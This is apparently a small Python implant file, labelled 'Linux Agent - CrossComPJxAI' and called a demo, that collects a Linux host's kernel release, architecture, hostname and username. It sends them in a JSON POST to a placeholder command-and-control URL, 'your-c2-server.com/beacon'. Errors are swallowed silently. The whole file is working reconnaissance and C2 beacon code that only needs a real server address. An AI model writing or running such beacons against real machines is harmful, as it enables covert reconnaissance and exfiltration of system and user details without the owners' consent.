"""
Linux Agent - CrossComPJxAI
Passive recon, device info, and C2 beacon (demo)
"""
import platform, socket, json, time, requests, os

C2_URL = "http://your-c2-server.com/beacon"
AGENT_ID = "linux-" + str(int(time.time()))

def get_device_info():
    return {
        "agent_id": AGENT_ID,
        "platform": "Linux",
        "release": platform.release(),
        "machine": platform.machine(),
        "hostname": socket.gethostname(),
        "user": os.getenv("USER", "unknown")
    }

def beacon():
    info = get_device_info()
    try:
        requests.post(C2_URL, json=info, timeout=5)
    except Exception:
        pass

if __name__ == "__main__":
    beacon()